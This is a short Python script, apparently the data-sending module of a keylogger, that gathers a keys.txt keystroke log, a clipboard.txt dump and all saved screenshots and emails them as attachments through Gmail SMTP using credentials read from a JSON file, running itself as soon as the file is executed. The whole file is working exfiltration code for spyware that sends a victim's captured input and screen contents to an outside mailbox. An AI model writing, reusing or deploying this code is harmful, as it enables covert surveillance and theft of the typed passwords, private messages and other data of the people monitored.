import smtplib
import imghdr
from email.message import EmailMessage
import json
import os

#A function that sends the data to the mail
def SendMail():
    f = open('credentials.json',)
    data = json.load(f)
    EMAIL_ADDRESS = data["email"]
    EMAIL_PASSWORD = data["password"]
    path = './screenshot/'

    if not os.path.isdir(path):
        os.mkdir(path)

    msg = EmailMessage()
    msg['Subject'] = 'Stated...'
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg.set_content("This is the message body")
    #Checking if "keys.txt" exist in  the folder of the project
    if("keys.txt" in os.listdir(os.getcwd())):
        msg.add_attachment(open("keys.txt", "r").read(), filename="keys.txt")
    #Checking if "clipboard.txt" exist in  the folder of the project
    if ("clipboard.txt" in os.listdir(os.getcwd())):
        msg.add_attachment(open("clipboard.txt", "r").read(), filename="clipboard.txt")
    #The attachment of the screenshots
    for images in os.listdir(path):
        print(f'{images} sent ')
        with open(path+images,'rb') as file:
            file_data=file.read()  #the image file
            file_type=imghdr.what(file.name) #the type of the image
            file_name=file.name #the name of the image
        msg.add_attachment(file_data,maintype='image',subtype=file_type,filename=file_name)


    #Connect to server and sending the mail with the attachments
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)

SendMail()